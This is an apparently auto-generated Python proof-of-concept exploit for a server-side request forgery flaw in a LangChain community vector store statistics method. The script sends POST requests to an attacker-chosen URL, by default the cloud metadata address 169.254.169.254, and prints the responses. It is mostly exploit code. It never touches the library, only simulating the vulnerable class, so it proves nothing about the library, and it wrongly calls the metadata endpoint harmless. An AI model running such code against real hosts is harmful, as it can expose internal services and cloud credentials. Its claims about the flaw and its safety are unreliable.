#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-005
# Sink: get_vectorstore_statistics
# Auto-generated — run with: python3 ssrf_url_concatenating_self_get_vectorstore_statistics_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langchain-community-only vector store statistics endpoint.

Vulnerability: The get_vectorstore_statistics method constructs a URL by concatenating
self.url (user-controlled) with '/v1/statistics' and makes a POST request without any
validation. An attacker can set self.url to internal IPs (e.g., cloud metadata endpoints)
to perform SSRF and read the response.

Usage:
    python3 poc_ssrf.py [--target TARGET_URL]

    Default target: http://169.254.169.254 (AWS metadata endpoint - safe read-only)
    Use --target to specify a different internal service.

Requirements: requests (standard library compatible)
"""

import argparse
import sys
import requests
from typing import Any, Dict, Optional


class VectorStoreStatisticsExploit:
    """
    Simulates the vulnerable langchain-community VectorStore class.
    The __init__ takes a user-controlled URL, and get_vectorstore_statistics
    makes an unvalidated POST request to self.url + '/v1/statistics'.
    """

    def __init__(self, url: str):
        """
        Entry point for attacker-controlled URL.
        No validation is performed on the URL.
        """
        self.url = url.rstrip('/')  # Simulates the vulnerable initialization

    def get_vectorstore_statistics(self) -> Optional[Dict[str, Any]]:
        """
        Vulnerable method: constructs URL from self.url + '/v1/statistics'
        and makes a POST request. Response is returned to caller.
        """
        target_url = self.url + "/v1/statistics"
        print(f"[*] Attempting SSRF to: {target_url}")

        try:
            response = requests.post(
                target_url,
                json={},
                headers={"Content-Type": "application/json"},
                timeout=10,
            )
            print(f"[+] Response status: {response.status_code}")
            print(f"[+] Response headers: {dict(response.headers)}")
            print(f"[+] Response body (first 500 chars): {response.text[:500]}")
            return response.json()
        except requests.exceptions.ConnectionError as e:
            print(f"[-] Connection error: {e}")
            print("[-] Target may be unreachable or blocking the request.")
        except requests.exceptions.Timeout:
            print("[-] Request timed out.")
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
        except ValueError as e:
            print(f"[-] Failed to parse JSON response: {e}")
            print(f"[-] Raw response: {response.text}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF in langchain-community vector store statistics"
    )
    parser.add_argument(
        "--target",
        default="http://169.254.169.254",
        help="Target URL for SSRF (default: AWS metadata endpoint - safe read-only)",
    )
    args = parser.parse_args()

    print("[*] SSRF Proof-of-Concept for langchain-community-only")
    print(f"[*] Target: {args.target}")
    print("[*] Note: Default target is AWS metadata (169.254.169.254) - read-only, no side effects.")
    print("[*] For testing, use a local HTTP server or a benign internal service.\n")

    # Create the vulnerable object with attacker-controlled URL
    exploit = VectorStoreStatisticsExploit(args.target)

    # Trigger the SSRF
    result = exploit.get_vectorstore_statistics()

    if result is not None:
        print(f"\n[+] Successfully retrieved data from internal service!")
        print(f"[+] Parsed JSON: {result}")
    else:
        print("\n[-] Exploit did not return data. Check target availability.")
        print("[-] This may indicate the target is not reachable or the endpoint doesn't exist.")


if __name__ == "__main__":
    main()
